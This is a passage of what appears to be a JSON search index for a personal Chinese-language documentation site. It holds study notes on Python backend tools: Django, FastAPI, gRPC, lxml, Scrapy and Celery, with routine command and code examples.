FilePathField FloatField GenericIPAddressField ImageField IntegerField JSONField NullBooleanField PositiveBigIntegerField PositiveIntegerField PositiveSmallIntegerField SlugField SmallAutoField SmallIntegerField TextField TimeField URLField UUIDField","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-index.html"},{"title":"Django","text":"学习进度: https://docs.djangoproject.com/zh-hans/3.2/topics/db/models/ 下的字段选项 执行查询 | Django 文档 | Django (djangoproject.com) 参考:: 使用Django 编写你的第一个 Django 应用，第 3 部分 创建项目 模型模块module 自定义sql 内部类Meta 抽象基类 后台管理模块admin settings常用字段 应用打包 测试 QuerySet-Api FQ 问题总结 模型类 方法 Model.save() Model.save(force_insert=False, force_update=False, using=DEFAULT_DB_ALIAS, update_fields=None For details on using the force_insert and force_update arguments,\nsee 强制执行 INSERT 或 UPDATE .\nDetails about the update_fields argument can be found in the 指定要保存的字段 section. 如果你想自定义保存行为，你可以覆盖这个 save() 方法。\n更多细节请参见 重写之前定义的模型方法 模型中的一些函数/方法 __str__() 返回值表示这个对象的str get_absolute_url() 计算一个对象的url 任何需要一个唯一url的都需要定义此方法 常用指令 常用指令: # 查看django位置\npython -c \"import django; print(django.__path__)\"\n\n# 打开django自带的命令行工具\npython manage.py shell\n\n# 启动 polls应用的自动化测试\npython manage.py test polls\n\n# 创建 django 项目\n$ django-admin startproject $pro\n\n# 安装模块app\n$ python manage.py startapp $app\n\n# 启动服务\n$ python manage.py runserver 0:8000\n\n# 查找所有可用的模型 为任意一个在数据库中不存在对应数据表的模型创建迁移脚本文件\n$ python manage.py makemigrations\n\n# 运行这些迁移来自动创建数据库表\n#  migrate 命令只会为在 INSTALLED_APPS 里声明了的应用进行数据库迁移。\n$ python manage.py migrate\n\n# 创建某个app的表结构\n$ python manage.py makemigrations $app\n$ python manage.py migrate\n\n# 含 django 的环境变量shell\n$ python manage.py shell url path 四个参数: # view 可以是 使用 include() 使用其他的app下的url\n# name 别名\npath('route', view.fun, name='') 创建管理员用户: $ python manage.py createsuperuser\nUsername: admin\nEmail address: admin@example.com\nPassword: **********\nPassword (again): *********\nSuperuser created successfully. 数据库的设置 setting.py: DATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'mydatabase',\n        'USER': 'mydatabaseuser',\n        'PASSWORD': 'mypassword',\n        'HOST': '127.0.0.1',\n        'PORT': '5432',\n    }\n} 默认的，Django 会在外键字段名后追加字符串 \"_id\" 。（同样，这也可以自定义。） 外键 pk就是primary key的缩写。通常情况下，一个模型的主键为\"id\"，所以下面三个语句的效果一样: > Blog.objects.get(id__exact=14) # Explicit form\n> Blog.objects.get(id=14) # __exact is implied\n> Blog.objects.get(pk=14) # pk implies id__exact 参考: 查询操作 web的瓶颈 单个请求里太多sql串行查询导致耗时长 单个sql太过复杂导致耗时长","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-index.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-index.html"},{"title":"FastAPI","text":"官网文档: FastAPI 菜鸟: FastAPI教程 注解 如果你正在开发一个在终端中运行的命令行应用而不是 web API，不妨试下 Typer .\nTyper 是 FastAPI 的小同胞。它想要成为命令行中的 FastAPI。 关键特性 快速：可与 NodeJS 和 Go 并肩的极高性能（归功于 Starlette 和 Pydantic）。最快的 Python web 框架之一。 高效编码：提高功能开发速度约 200％ 至 300％。* 更少 bug：减少约 40％ 的人为（开发者）导致错误。* 智能：极佳的编辑器支持。处处皆可自动补全，减少调试时间。 简单：设计的易于使用和学习，阅读文档的时间更短。 简短：使代码重复最小化。通过不同的参数声明实现丰富功能。bug 更少。 健壮：生产可用级别的代码。还有自动生成的交互式文档。 标准化：基于（并完全兼容）API 的相关开放标准：OpenAPI (以前被称为 Swagger) 和 JSON Schema。 FastAPI 特点 高性能： 基于Starlette和Pydantic，利用异步（asynchronous）编程，提供出色的性能。 自动文档生成： 自动生成交互式API文档，支持Swagger UI和ReDoc，让API的理解和测试更加直观。 类型注解支持： 利用Python的类型提示，提供更严格的输入验证和更好的代码提示。 异步支持： 支持异步请求处理，使得处理IO密集型任务更加高效。 FastAPI 适用场景 构建API后端： 用于构建RESTful API，支持前后端分离的Web应用。 微服务架构： 可以作为微服务的后端框架，支持快速开发和部署。 数据处理API： 适用于处理数据，接收和返回JSON数据。 实时通信： 支持WebSocket，适用于实时通信场景。 为什么选择 FastAPI？ Pythonic： 使用Python的自然语法和类型提示，降低学习曲线。 性能优越： 利用异步编程和底层的Starlette框架，提供卓越的性能。 文档友好： 自动生成交互式文档，减少文档维护的工作量。 生态系统： 基于Python生态系统，可以方便地集成各种库和工具。 结构详解 安装配置 简单使用 交互式API文档 基本路由 请求和响应 FastAPI-Pydantic模型 路径操作依赖项 表单数据 常见问题","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-index.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-index.html"},{"title":"Python框架","text":"此节主要是Web框架 Django FastAPI","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-index.html","loc":"/yq-docs-rear-end-python-Web-framework-index.html"},{"title":"cookbook","text":"函数 网络与 Web 编程 元编程 文件、IO 并发编程 模块与包 类与对象 字符串操作 数据编码和处理 迭代器、生成器 数字、日期、时间 测试、调试和异常 脚本编程与系统管理","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-index.html","loc":"/yq-docs-rear-end-python-cookbook-index.html"},{"title":"Python","text":"Web框架 cookbook 相关技术实现 python三方库 python标准库 概念相关 性能分析 包管理器 问题总结 教程 python 中 := 的作用 部分语言中 := 是一个赋值语句 python正常来说是没有这种这种语法的 不过有一种特殊情况是用于生成式的赋值操作 [x for x in range(10)]\n# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n[y for x in range(10) if (y:=(x*2))]\n# [2, 4, 6, 8, 10, 12, 14, 16, 18] (暂时只见过这种情况) python的单双引号 基本没有差别，混合使用可以减少转义: >#包含单引号字符串\n>my_str = 'I\\'m a student'\n>my_str = \"I'm a student\"\n>\n>#双引号\n>my_str = \"Jason said \\\"I like you\\\"\"\n>my_str = 'Jason said \"I like you\"' 文件读写模式 python 文件处理的打开方式有很多种: os.mknod(\"test.txt\")      # 创建空文件\nfp = open(\"test.txt\",w)   # 直接打开一个文件，如果文件不存在则创建文件 这里主要介绍open 模式,\n要了解文件读写模式，需要了解几种模式的区别，以及对应指针 r 读取文件，若文件不存在则会报错 w 写入文件，若文件不存在则会先创建再写入，会覆盖原文件 a 写入文件，若文件不存在则会先创建再写入，但不会覆盖原文件，而是追加在文件末尾 rb,wb,ab 分别于r,w,a类似，但是用于读写二进制文件 r+ 可读、可写，文件不存在也会报错，写操作时会覆盖;\n即可以读取文件内容，保存原有内容，追加写内容，写动作则是追加的新内容。其作用和a+基本相同。 w+ 可读，可写，文件不存在先创建，会覆盖;\n即w+是打开后，清空原有内容，成为一个新的空文件，对这个空文件具有读写权限。 a+ 可读、可写，文件不存在先创建，不会覆盖，追加在末尾 rb+ 以二进制读写模式打开 (参见 r+ ) wb+ 以二进制读写模式打开 (参见 w+ ) ab+ 以二进制读写模式打开 (参见 a+ ) 参考: https://blog.csdn.net/longshenlmj/article/details/9921665 在linux使用py遇到的一些问题 pkg_resources.DistributionNotFound: pip==0.8.1 具体报错如下: $ sudo pip install gevent-websocket\n\nTraceback (most recent call last):\nFile \"/usr/local/bin/pip\", line 5, in <module>\nfrom pkg_resources import load_entry_point\nFile \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 2675, in <module>\nparse_requirements(__requires__), Environment()\nFile \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 552, in resolve\nraise DistributionNotFound(req)\npkg_resources.DistributionNotFound: pip==0.8.1 可以使用which pip查看一下命令的位置，然后vim查看一下，\n会发现文件里是定死了版本号的，想办法改一下\n可能是安装了多个pip版本或者pip管理包工具引起的\n最终的解决方案: which pip\n# /usr/local/bin/pip\n\npython -m pip install --upgrade --force pip==9                #这里我需要的是9版本的pip\ncat /usr/local/bin/pip2.7 >/usr/local/bin/pip         #这里是which位置\n\nwhich pip\n# /usr/bin/local      这里因为我自己设置的原因有一个\nln -s /usr/local/bin/pip2.7 /usr/bin/local\n\n##\n#     源文件/usr/bin/local和/usr/local/bin/pip都限制死了pip版本，把正确的写进去\n## 关于python的字典 python3.6之前的dict都是无序的 当版本 >= 3.6 时，字典为有序的 py3.6 之前的无序字典: > 是以八行三列的数据结构存储\n>\n> 每一行有三列，每一列占用8byte的内存空间，所以每一行会占用24byte的内存空间\n>\n> 第一列：哈希值对8取余 hash(sKey)\n>\n> 第二列：sKey\n>\n> 第三列：sValue 当字典的键值对数量超过当前数组长度的2/3时，数组会进行扩容，\n8行变成16行，16行变成32行。\n长度变了以后，原来的余数位置也会发生变化，此时就需要移动原来位置的数据，导致插入效率变低。 py3.6之后: > 换成了两个一维列表组成 my_dict = {} 此时的内存示意图 （indices 指数 entries 条目）: indices = [None, None, None, None, None, None, None, None]\n\nentries = [] 这里先通过对 sKey 取余为 x ，然后 在 entries 插入一个列表 [ \"hash值\", sKey, sValue]\n再在 indices 保存插入列表的下标，indices[x] = 下标 Python自带的这个 hash 函数，和我们传统上认为的Hash函数是不一样的。\nPython自带的这个 hash 函数计算出来的值，只能保证在每一个运行时的时候不变，\n但是当你关闭Python再重新打开，那么它的值就可能会改变， 关于负数取余 带余除法， 对于任意一个整数n ，都可以表示为 n=k*q + r ，其中 0 <= r < q\n这里的 r 就是 n 除以 q 的余数，通常记做 n≡r(mod q) 例如-9=(-2)*5+1，则-9除以5的余数为1。 注：java 中 % 优先级高于 - 项目管理工具 才发现python居然没有项目管理工具比如maven 只有个pip 包管理器 python的按位与、或 同为 2的n次方 的数 按位或的值等于各个数相加 并且用其中的一个值和最终的数与会得到他本身，反之为0: if __name__ == '__main__':\n    a, b, c = 2, 4, 8\n    d = a | b | c\n\n    print(d)\n    print(a & d)\n    print(d & c)\n    print(32 & d)\n    print(32 & c)\n\n    # 14\n    # 2\n    # 8\n    # 0\n    # 0 一些斜杠转义 转义字符 , 顾名思义，也就是在我们编码时会使用到的特殊字符: | 转义字符          | 描述       |\n| ----------------- | ---------- |\n| \\（处于行尾位置） | 续行符     |\n| \\\\                | 反斜杠     |\n| '                 | 单引号     |\n| \\\"                | 双引号     |\n| \\b                | 退格       |\n| \\n                | 换行       |\n| \\v                | 纵向制表符 |\n| \\t                | 横向制表符 |\n| \\r                | 回车       |\n| \\f                | 换页       | python执行linux命令 code: import subprocess\nimport os\n\ndef subprocess_():\n    \"\"\"\n    subprocess模块执行linux命令\n    :return:\n    \"\"\"\n    subprocess.call(\"ls\") # 执行ls命令\n\ndef system_():\n    \"\"\"\n    system模块执行linux命令\n    :return:\n    \"\"\"\n    # 使用system模块执行linux命令时，如果执行的命令没有返回值res的值是256\n    # 如果执行的命令有返回值且成功执行，返回值是0\n    res = os.system(\"ls\")\n\ndef popen_():\n    \"\"\"\n    popen模块执行linux命令。返回值是类文件对象，获取结果要采用read()或者readlines()\n    :return:\n    \"\"\"\n    val = os.popen('ls').read() # 执行结果包含在val中\n\ndef main():\n    subprocess_() # 方法1\n    system_() # 方法2\n    popen_() # 方法3 if __name__ == '__main__': main() 赋值 快速赋值: a=b=c=[]\n\n# 因为[]是可变的, a b c 共享内存 设计模式 https://refactoringguru.cn/design-patterns/catalog 关于多线程队列实现 threading 队列是基于双向队列 dedque 实现 multiprocessing 队列是基于 管道 pipe 实现 有最大限制，win10是1408，linux是6570 关于可重入锁 为什么要有可重入锁？ 当存在继承或者递归调用的时候，可能会出现重复加锁的情况， 如果不能重复加锁，就会自己把自己给锁死 *args, **kwargs 单个 * 表示元组列表\n** 表示转换为字典      这个时候首层的字典的键必须为字符串 python三种基础序列类型 list          可变序列，存放同类项目的集合 tuple         不可变序列，存放固定长度的不同种类的对象集合 range         不可变的数字序列，通常在for循环中循环指定的次数 一些优化建议 创建列表时，建议有初始值就写初始值，不要创建空列表再填充。因为创建空列表一定会扩容 列表的合并，使用 extend或者 += 较好于直接 + pyhton的选项 执行时不生成pyc文件: python -B 获取对象/文件大小 对象 使用 sys.getsizeof() 获取程序中声明的一个整数，存储在变量中的大小 相似场景：文件复制案例中需要获取文件大小，尝试使用 sys.getsizeof()方法\n确认：sys.getsizeof()方法用于获取变量中存储数据的大小 详细可参考: sys 文件 使用: os.path.getsize(path) 获取指定路径 path 下的文件的大小，以字节为单位\n参考: os","tags":"后端; python","url":"/yq-docs-rear-end-python-index.html","loc":"/yq-docs-rear-end-python-index.html"},{"title":"grpc使用入门","text":"RPC, 远程过程调用服务, 注重传输协议于序列化. 一些认识 HTTP认识 gRPC是由Google公司开源的高性能RPC框架。支持多语言、多平台，\n其消息协议使用Google自家开源的Protocol Buffers协议机制（proto3） 序列化，传输使用HTTP/2标准，支持双向流和连接多路复用。 安装 安装: pip install grpc grpcio-tools 使用流程(用例说明) 以一个用例说明. 背景: 业务已有一个 Cat 类, 如下 需要与之相关的 rpc 服务来获取其属性 流程: 编写proto文件, 定义数据通信协议 根据编写好的proto协议文件, 生成相应的python文件 编写server服务端 编写client客户端 编写 proto 协议文件 根据需求编写好proto协议文件如下: 其中, 使用message来自定义消息类型, 如定义一个String消息, 只包含一个string类型数据: message StringMessage{\n    string message = 1;\n} 技巧 可用 map 定义map类型 可用 repeated 来表示可重复类型, 如: repeated string message = 1; 注意map默认可重复, 不能加 repeated. 私以为, 一般情况下, 对于普通的数据或者约定好的通用接口类型返回, 使用message定义较方便,\n但是对于其中的复杂数据类型, 还是使用 bytes 传递二进制数据, 获取后自行处理较方便. 记得大学学java的那段时间, 接口一般都是使用 Result 封装的, 大概如下: class Result(){\n    int code;\n    string message;\n    Map<T, T> data;\n} 应该是这样, 具体记不清了, 很久没用了. 如果将这么一个约定好的接口返回写进proto, 那么可以这样: message Result{\n    int32 code = 1;\n    string message = 2;\n    bytes data = 3;\n} 这里message定义消息属性的值为 1, 2, 3 , 并非强制这样写, 我看网上大多都是按照123顺序定义值, 多半是跟着官网文档用例来的. 另外本文的协议文件定义了较多数据类型, 正式使用时是不建议的, 最好是只定义一个请求类型, 一个返回类型吧, 此处为用例只是表示可以这么写. 可以看出对于基本的数据类型, 可以很方便定义, 哪怕是复杂一点, 比如有一个 Person 类, 也可以进行多层封装. 但是对于python而言, 尤其是字典类型, 其值的类型大多都不是指定的, 比如本例的 Cat 类获取所有属性(get_all): def all_attr(self):\n    return {\n        'name': self._name,         # 这是 str\n        'age':  self._age,          # 这是 int\n        'love': self._love,         # 这是 tuple\n        'food_once': self._eat_food_once,   # 这个则是 Dict[str, float]\n    } 这个时候使用 message 中的普通类型封装就很难, 所以还是决定使用 bytes 直接传递二进制的data数据方便些. RpcCat 是rpc服务, 内定义了将支持哪些调用, 如: rpc get_name (EmptyMessage) returns (StringMessage) {} 表示定义一个rpc调用, 名为 get_name, 请求参数类型为 EmptyMessage,\n返回参数类型为 StringMessage (两类型已用message定义). 生成相应的python文件 根据编写好的proto文件生成对应的py文件: mkdir proto\npython -m grpc_tools.protoc --pyi_out=./proto --python_out=./proto --grpc_python_out=./proto -I. rpc_cat.proto 参数解释: -I PATH , --proto_path= PATH proto文件路径, 包括导入的 --pyi_out= OUT_DIR Generate Python pyi stub. --python_out= OUT_DIR Generate Python source file. --grpc_python_out= OUT_DIR Generate Python source file. 注意这里我放到了 proto 文件夹下, 需要自行处理一下环境导入问题: cd proto\n\necho \"import sys\nsys.path.append('./proto')\n\" > __init__.py 注解 protoc: protobuf 编译器(compile), 将 proto 文件编译成不同语言的实现, 这样不同语言中的数据就可以和 protobuf 格式的数据进行交互 protobuf 运行时(runtime): protobuf 运行时所需要的库, 和 protoc 编译生成的代码进行交互 编写server服务端 源码: 注意传参必须使用位置参数: # message=self._cat.love() 的 message不能丢\nreturn rpc_cat_pb2.TupleMessage(message=self._cat.love()) 否则会有报错: TypeError: No positional arguments allowed 编写client客户端 源码: 字典数据直接使用 bytes 定义消息, 使用 json 转换, 较好. 注解 python 可用的 rpc 框架还是比较多的, 比如 grpc, thrift, rryc等 其中 grpc 等拓展性稳定性是最好的 thrift 对 python 的支持不是很好, 但是支持多语言 rryc 基本是服务于纯python, 对只使用 python 的服务较友好 支持的通信方式 一次请求, 一次应答 一次请求, 流式应答 流式请求, 一次应答 流式请求, 流式应答 如要使用流式请求/应答, 参数类型前加 stream 即可. 比如上面的例子, 定义了 流请求, 应答流: rpc get_attr_by_name_with_stream (stream StringMessage) returns (stream StringMessage) {} 对于python代码中的实现, 使用迭代器就好. client端, 请求: @property\ndef _connection(self):\n    if self._stub is None:\n        # with grpc.aio.insecure_channel('localhost:50052') as channel:\n        self._stub = cat_pb2_grpc.RpcCatStub(grpc.aio.insecure_channel('localhost:50052'))\n    return self._stub\n\ndef get_attr_by_stream(self):\n\n    def stream_message():\n        for s in ('name', 'age', 'love'):\n            yield cat_pb2.StringMessage(message=s)\n\n    response = self._connection.get_attr_by_name_with_stream(stream_message())\n\n    return [x for x in response] server端, 应答: def get_attr_by_name_with_stream(self, request_iterator, context):\n    for request in request_iterator:\n        yield rpc_cat_pb2.StringMessage(message=self._cat.get_attr_by_name(request.message))","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-GRPC.html","loc":"/yq-docs-rear-end-python-python-three--party-library-GRPC.html"},{"title":"lxml","text":"github地址: https://github.com/lxml/lxml 官方主页: <https://lxml.de> 需要先了解 index 的前置知识 安装: pip install lxml lxml提供了两种解析网页的方式，一种是你解析自己写的离线网页时，另一种 则是解析线上网页。 导入包: from lxml import  etree 1.解析离线网页: html=etree.parse('xx.html',etree.HTMLParser())\naa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href')\nprint(aa) 2.解析在线网页: from lxml import etree\nimport requests\nrep=requests.get('https://www.baidu.com')\nhtml=etree.HTML(rep.text)\naa=html.xpath('//*[@id=\"s_xmancard_news\"]/div/div[2]/div/div[1]/h2/a[1]/@href')\nprint(aa)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-LXML.html","loc":"/yq-docs-rear-end-python-python-three--party-library-LXML.html"},{"title":"Scrapy API参考","text":"Response Selector SelectorList","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-API-index.html"},{"title":"命令行工具","text":"参考: https://docs.scrapy.org/en/latest/topics/commands.html 配置文件位置: 优先级最低 系统配置 /etc/scrapy.cfg or c:\\scrapy\\scrapy.cfg\n优先级普通 用户配置 ~/.config/scrapy.cfg ($XDG_CONFIG_HOME) and ~/.scrapy.cfg ($HOME)\n优先级最高 项目配置 scrapy.cfg 实际生效的配置将会合并上述所有的配置, 支持的环境变量配置: SCRAPY_SETTINGS_MODULE (see Designating the settings)\nSCRAPY_PROJECT (see Sharing the root directory between projects)\nSCRAPY_PYTHON_SHELL (see Scrapy shell) 配置共享多个项目 注解 多个项目都需要在当前目录 scrapy.cfg 下定义多个项目(目录)的 scrapy.cfg : [settings]\ndefault = myproject1.settings\nproject1 = myproject1.settings\nproject2 = myproject2.settings 默认情况下, scrapy 执行会使用 default , 使用 SCRAPY_PROJECT 环境变量来\n切换不同项目: $ scrapy settings --get BOT_NAME\nProject 1 Bot\n$ export SCRAPY_PROJECT=project2\n$ scrapy settings --get BOT_NAME\nProject 2 Bot 使用 scrapy 工具 概览: Scrapy X.Y - no active project 语法: scrapy <command> [options] [args] 支持命令(不需要依赖项目): startproject 创建项目 语法: scrapy startproject <project_name> [project_dir] project_dir 项目模块目录名称, 如果不指定, 就跟 myproject 一致 后续的操作都要cd进目录: cd project_dir 其他指令 不依赖项目目录的指令 bench fetch genspider runspider shell settings version view 依赖项目目录的指令(只有在项目目录下才可以正常执行) check crawl edit list parse 自定义项目指令 使用 COMMANDS_MODULE 配置到 scrapy.cfg 实现 COMMANDS_MODULE 配置项 默认值: '' (empty string) Example: COMMANDS_MODULE = \"mybot.commands\" 通过 setup.py 入口注册 注解 也可以通过额外的库注册 比如: from setuptools import setup, find_packages\n\nsetup(\n    name=\"scrapy-mymodule\",\n    entry_points={\n        \"scrapy.commands\": [\n            \"my_command=my_scrapy_module.commands:MyCommand\",\n        ],\n    },\n)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-index.html"},{"title":"选择器","text":"主要是针对 HTML / XML 元素吧 选择器支持, 参考 Selectors 主要提供两种: response.css()\nresponse.xpath() 相关类是 Selector 除了调用response使用, 还可以直接实例使用: >>> from scrapy.selector import Selector\n>>> body = \"<html><body><span>good</span></body></html>\"\n>>> Selector(text=body).xpath(\"//span/text()\").get()\n'good' 或者自己构造response (HtmlResponse 是 TextResponse 的子类): >>> from scrapy.selector import Selector\n>>> from scrapy.http import HtmlResponse\n>>> response = HtmlResponse(url=\"http://example.com\", body=body, encoding=\"utf-8\")\n>>> Selector(response=response).xpath(\"//span/text()\").get()\n'good' Selector会自动解析 xml/html 实时交互解析, 建议使用 scrapy shell <CmdShell> 两种选择器详解(与Scrapy结合使用) CSS选择器 XPath选择器 甚至可以将 XPath 与 CSS 结合使用: # 对于 <img src='image4_thumb.jpg' alt='image4'/>\nresponse.css(\"img\").xpath(\"@src\")","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-index.html"},{"title":"Scrapy","text":"Python爬虫库 官网: https://scrapy.org 文档: https://docs.scrapy.org/en/latest/ Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。 Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。 通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。 架构 使用 选择器 命令行工具 API 安装: pip install Scrapy 注解 建议安装在虚拟环境以避免冲突 相关库 lxml : 高效的 xml 和 html 解析器 parsel: 基于 lxml 编写的一个 HTML/XML 数据提取库 w3lib: 处理 URL 和网页编码的多用途助手 twisted: 异步网络框架 cryptography : 处理各种网络级安全需求 pyOpenSSL: 处理各种网络级安全需求 注解 这些库可能依赖非Py库 相关工具 Scrapy shell","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-index.html"},{"title":"celery","text":"安装: pip install celery[librabbitmq,redis,auth,msgpack] 详细见: option_install 简介 分布式任务队列 一个简单、灵活、可靠的分布式系统，可用于处理大量消息的消息队列, 可用于处理实时数据以及任务调度 任务队列: 一般用于线程或计算机之间分配工作的一种机制 Celery 通过消息机制进行通信: Broker 中间人 Worker 职程 客户端向消息队列发送消息, 实际就是给到了 Broker,\n然后 Broker 将消息发给 Worker, 由 Worker 执行. Celery 可以在一台机器上运行，也可以在多台机器上运行，甚至可以跨数据中心运行。 优点: 分布式, 可多机运行 跨语言(协议) 自定义消息队列(Broker), 如: rabbitmq, redis 高可用, 如果出现丢失连接或连接失败，职程（Worker）和客户端会自动重试，并且中间人通过 主/主 主/从 的方式来进行提高可用性。 快速, 单个 Celery 进行每分钟可以处理数以百万的任务，而且延迟仅为亚毫秒（使用 RabbitMQ、 librabbitmq 在优化过后）。 灵活, Celery 的每个部分几乎都可以自定义扩展和单独使用.\n例如自定义连接池、序列化方式、压缩方式、日志记录方式、任务调度、生产者、消费者、中间人（Broker）等。 支持 Crontab 定时任务 内存保护, --max-tasks-per-child 参数适用于可能会出现资源泄漏（例如：内存泄漏）的任务 时间和速率的限制, 可以控制每秒/分钟/小时执行任务的次数，或者任务执行的最长时间，也将这些设置为默认值，针对特定的任务或程序进行定制化配置 相关说明: Celery Beat: 任务调度器，Beat 进程会读取配置文件的内容，周期性的将配置中到期需要执行的任务发送给任务队列 Celery Worker: 执行任务的消费者，通常会在多台服务器运行多个消费者来提高运行效率 Broker: 消息代理，也是任务队列本身（通常是消息队列或者数据库），通常称为消息中间件，\n接收任务生产者发送过来的任务消息，存进队列再按序分发给任务消费方 Producer: 任务生产者，调用 Celery API 的函数或者装饰器而产生任务并交给任务队列处理的都是任务生产者 中间件配置 Celery 需要消息中间件来进行发送和接收消息。 RabbitMQ 和 Redis 中间人的功能比较齐全，但也支持其它的实验性的解决方案，其中包括 SQLite 进行本地开发。 应用设计(编码) task.py: from celery import Celery\napp = Celery('tasks', broker='amqp://guest@localhost//')\n@app.task\ndef add(x, y):\n    return x + y 第一个参数为当前模块的名称，只有在 __main__ 模块中定义任务时才会生产名称。 第二个参数为中间人（Broker）的链接 URL。 app的传递 即 Celery 实例 的共享, 一般不建议使用全局的 app 变量, 而是以参数传递的形式替代: class Scheduler(object):\n    def __init__(self, app):\n        self.app = app 在celery内部实现中，使用 celery.app_or_default() 函数使得模块级别的 API 也能正常使用: from celery.app import app_or_default\n\nclass Scheduler(object):\n    def __init__(self, app=None):\n        self.app = app_or_default(app) 在开发环境中，可以通过设置 CELERY_TRACE_APP 环境变量在应用实例链被打破时抛出一个异常: $ CELERY_TRACE_APP=1 celery worker -l info 中文翻译文档称其为 打破链式操作：Breaking the chain 不是怎么理解是何含义 启动Worker 启动/运行 Celery 职程（Worker）服务 命令行启动 code: celery -A tasks worker --loglevel=info\n# celery -A src.time_schedule --workdir ./  worker -l info -E 注解 可以查看帮助信息: celery --help 直接在 python 中启动 调试时使用比较方便, 或者是一些需要在代码内部启动时 启动一个职程（Worker）:: from celery import Celery\napp = Celery()\n\n@app.task\ndef add(x, y): return x + y\n\nif __name__ == '__main__':\n    app.worker_main() 手动调用任务 命令行 使用命令行的方式, 详情可参考 命令行工具 例::\n\ncelery -A src.time_schedule call -a '[2, 2]'  src.time_schedule.pre_tasks.add\n7506ef60-5621-460a-8219-7a97f6e96f4e 代码使用方式 调用我们创建的实例任务，可以通过 delay() 进行调用。 delay() 是 apply_async() 的快捷方法，可以更好的控制任务的执行（详情：调用任务：Calling Tasks）: >>> from tasks import add\n>>> add.delay(4, 4) 该任务已经有职程（Worker）开始处理，可以通过控制台输出的日志进行查看执行情况。 调用任务会返回一个 AsyncResult 的实例，用于检测任务的状态，等待任务完成获取返回值（如果任务执行失败，会抛出异常）。\n默认这个功能是不开启的，如果开启则需要配置 Celery 的结果后端，见 保存任务结果 。 详细说明 使用 delay() 方法进行调用: >>> add.delay(2, 2) delay() 实际上为 apply_async() 的快捷使用: >>> add.apply_async((2, 2)) apply_async() 可以指定调用时执行的参数，例如运行的时间，使用的任务队列等: >>> add.apply_async((2, 2), queue='lopri', countdown=10) 上面的实例中，任务被下发到 lopri 队列中，任务下发之后会在最早10秒内执行。 直接调用任务函数进行执行任务，不会发送任何任务消息: >>> add(2, 2)\n4 每一个任务被调用时会赋值一个的任务ID（UUIID）: res = add.delay(2, 2)\nres.id 如果任务执行引发异常，可以进行检查异常以及溯源，默认情况下 result.get() 会抛出异常: >>> res = add.delay(2)\n>>> res.get(timeout=1)\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nFile \"/opt/devel/celery/celery/result.py\", line 113, in get\n    interval=interval)\nFile \"/opt/devel/celery/celery/backends/rpc.py\", line 138, in wait_for\n    raise meta['result']\nTypeError: add() takes exactly 2 arguments (1 given) 如果不希望 Celery 抛出异常，可以通过设置 propagate 来进行禁用: >>> res.get(propagate=False)\nTypeError('add() takes exactly 2 arguments (1 given)',) 在这种情况下，他可以返回引发错误的实例，需要检查任务是否执行成功还是失败，可以通过在结果实例中使用对应的方法: >>> res.failed()\nTrue\n\n>>> res.successful()\nFalse 如何知道任务是否执行失败？可以通过查看任务的 state 进行查看: >>> res.state\n'FAILURE' 一个任务只能有当前只能有一个状态，但他的执行过程可以为多个状态，一个典型的阶段是: PENDING -> STARTED -> SUCCESS 启动状态是一种比较特殊的状态，仅在 task_track_started 启用设置或 @task(track_started=True)的情况下才会进行记录。\n挂起状态实际上不是记录状态，而是未知任务ID的默认状态，可以从此实例中看到: >>> from proj.celery import app\n\n>>> res = app.AsyncResult('this-id-does-not-exist')\n>>> res.state\n'PENDING' 重试任务比较复杂，为了证明，一个任务会重试两次，任务的阶段为: PENDING -> STARTED -> RETRY -> STARTED -> RETRY -> STARTED -> SUCCESS 保存任务结果 如使用Redis作为Celery结果后端和中间人, app = Celery('tasks', backend='redis://localhost', broker='redis://localhost') 已经配置结果后端，重新调用执行任务。会得到调用任务后返回的一个 AsyncResult 实例: >>> result = add.delay(4, 4) ready() 可以检测是否已经处理完毕: >>> result.ready()\nFalse 整个任务执行过程为异步的，如果一直等待任务完成，会将异步调用转换为同步调用: >>> result.get(timeout=1)\n8 如果任务出现异常，get() 会再次引发异常，可以通过 propagate 参数进行覆盖: >>> result.get(propagate=False) 如果任务出现异常，可以通过以下命令进行回溯: >>> result.traceback 注解 也可以使用配置文件进行配置, 见 conf_celery 如果后端使用资源进行存储结果，必须要针对调用任务后返回每一个 AsyncResult 实例调用 get() 或 forget() ，进行资源释放。 远程控制 使用 RabbitMQ（AMQP）、Redis 或 Qpid 作为中间人（Broker），可以在运行时控制和检查职程（Worker）。 例如，当前职程（Worker）正在处理的任务: $ celery -A proj inspect active 这是通过广播消息实现的，集群中所有职程（Worker）都会所有收到远程控制发出的指令。\n也可以通过 --destination 选项指定一个或多个职程（Worker）进行操作，使用\",\"进行分割职程（Worker）主机列表: $ celery -A proj inspect active --destination=celery@example.com 如果没有提供目的地，那么每个工作人员都将采取行动并回复请求。 celery inspect 